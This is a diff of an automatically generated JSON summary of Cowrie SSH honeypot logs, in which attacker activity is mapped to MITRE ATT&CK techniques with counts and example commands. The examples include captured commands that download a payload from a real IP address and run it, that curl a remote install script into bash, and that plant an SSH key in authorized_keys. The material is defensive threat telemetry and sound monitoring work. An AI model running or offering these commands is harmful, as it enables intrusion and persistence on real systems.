@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-11 16:03:01",
+  "generated": "2026-08-11 17:01:44",
   "totals": {
-    "commands": 8093,
-    "login_failed": 3998,
-    "login_success": 1800,
-    "sessions": 4331
+    "commands": 9268,
+    "login_failed": 4268,
+    "login_success": 2063,
+    "sessions": 4617
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3998,
+      "count": 4268,
       "examples": [
         "root / 123456",
         "root / admin",
@@ -21,14 +21,14 @@
         "root / !QAZ2wsx3edc"
       ],
       "first": "2026-08-11T00:00:02.784296Z",
-      "last": "2026-08-11T16:03:00.647422Z",
-      "unique_ips": 113
+      "last": "2026-08-11T17:00:03.722819Z",
+      "unique_ips": 117
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1800,
+      "count": 2063,
       "examples": [
         "uname -a / exit",
         "root / root",
@@ -37,14 +37,14 @@
         "enable / shell"
       ],
       "first": "2026-08-11T00:00:05.505729Z",
-      "last": "2026-08-11T16:03:01.049276Z",
-      "unique_ips": 97
+      "last": "2026-08-11T17:00:04.774725Z",
+      "unique_ips": 100
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 405,
+      "count": 454,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-08-11T15:45:26.061455Z",
-      "unique_ips": 37
+      "last": "2026-08-11T17:00:04.778932Z",
+      "unique_ips": 40
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 254,
+      "count": 271,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -69,22 +69,36 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-08-11T15:54:12.927868Z",
-      "unique_ips": 38
+      "last": "2026-08-11T17:00:05.737562Z",
+      "unique_ips": 41
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 59,
+      "count": 62,
       "examples": [
         "/bin/busybox ps; /bin/busybox ECCHI",
         "ps | grep '[Mm]iner'",
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-08-11T00:40:36.300925Z",
-      "last": "2026-08-11T15:41:48.987682Z",
+      "last": "2026-08-11T16:31:29.181757Z",
       "unique_ips": 3
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 31,
+      "examples": [
+        "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
+      ],
+      "first": "2026-08-11T00:53:13.060148Z",
+      "last": "2026-08-11T16:31:27.455347Z",
+      "unique_ips": 30
     },
     {
       "id": "T1082",
@@ -101,20 +115,6 @@
       "first": "2026-08-11T00:27:16.369209Z",
       "last": "2026-08-11T15:03:52.659751Z",
       "unique_ips": 19
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 28,
-      "examples": [
-        "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "id"
-      ],
-      "first": "2026-08-11T00:53:13.060148Z",
-      "last": "2026-08-11T15:41:55.048662Z",
-      "unique_ips": 27
     },
     {
       "id": "T1059.004",
@@ -147,12 +147,12 @@
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 7,
+      "count": 8,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-08-11T01:37:12.477623Z",
-      "last": "2026-08-11T15:44:16.342406Z",
+      "last": "2026-08-11T17:00:04.778932Z",
       "unique_ips": 2
     },
     {
@@ -232,67 +232,67 @@
   "unmapped": [
     [
       "sh",
-      1711
+      1973
     ],
     [
       "system",
-      1657
+      1915
     ],
     [
       "shell",
-      1656
+      1915
     ],
     [
       "/bin/busybox",
-      762
+      1059
     ],
     [
       "/bin/busybox ECCHI",
-      165
+      174
     ],
     [
       "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI",
-      55
+      58
     ],
     [
       "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon",
-      55
+      58
     ],
     [
       "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
-      55
+      58
     ],
     [
       "cd /dev/",
-      55
+      58
     ],
     [
       "/bin/busybox cat /bin/echo",
-      55
+      58
     ],
     [
       "enable",
-      39
+      42
     ],
     [
       "linuxshell",
-      33
+      36
     ],
     [
       "ping ;sh",
-      33
+      36
     ],
     [
       "enablelinuxshell",
-      25
+      28
     ],
     [
       "busybox",
-      25
+      28
     ],
     [
       "cd /proc && cat self/cmdline",
-      25
+      28
     ],
     [
       ">> .d",
